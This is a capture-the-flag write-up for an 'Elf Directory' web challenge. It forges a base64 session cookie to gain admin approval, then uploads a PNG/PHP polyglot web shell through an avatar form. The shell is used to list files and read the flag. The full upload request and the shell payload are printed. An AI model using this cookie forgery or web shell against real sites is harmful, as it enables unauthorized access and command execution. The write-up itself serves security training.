
## Description
Can you infiltrate the Elf Directory to get a foothold inside Santa's data warehouse in the North Pole?

## Solution

Login page
<img width="1046" alt="image" src="https://user-images.githubusercontent.com/18641572/144716746-eec531e4-65f5-47be-a8b8-d8bf2e7f08e9.png">

Register any user & log in
<img width="1054" alt="image" src="https://user-images.githubusercontent.com/18641572/144716773-174267df-e6bc-44a4-b852-dbab138a3d24.png">

Then add yourself possibility to edit your profile:

Decrypt Cookie PHPSESSID (urldecode + base64 decode):

`eyJ1c2VybmFtZSI6ImFkbWluIiwiYXBwcm92ZWQiOnRydWV9` -> `{"username":"admin","approved":false}`

Change to  `{"username":"admin","approved":true}`

Then you have possibility to upload PNG picture for your profile. But it is carefully checked
with PNG file structure (not only magic number, but first bytes), but extension is not checked.
So we could use this upload possiblity to upload .php file

Use upload avatar png picture functionality to get web shell (e.g via Burp Suite)
```
POST /upload HTTP/1.1
Host: 46.101.92.47:30397
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------385168380317616655742649190565
Content-Length: 329
Origin: http://46.101.92.47:30397
DNT: 1
Connection: close
Referer: http://46.101.92.47:30397/
Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImFkbWluIiwiYXBwcm92ZWQiOnRydWV9
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

-----------------------------385168380317616655742649190565
Content-Disposition: form-data; name="uploadFile"; filename="alpha_2px.php"
Content-Type: image/png

PNG


IHDRÄ
IDATxc6ÐÝIEND®B`
<?php system($_GET['cmd']); ?>
-----------------------------385168380317616655742649190565--
```


Going to
`http://46.101.92.47:30397/uploads/5c770_alpha_2px.php?cmd=ls%20/`

we could see among other files file
`flag_65890d927c37c33.txt`


Then we read it
```
http://46.101.92.47:30397/uploads/5c770_alpha_2px.php?cmd=cat%20/flag_65890d927c37c33.txt

�PNG  IHDRĉ IDATxc6Ј�IEND�B`� HTB{br4k3_au7hs_g3t_5h3lls} 
```
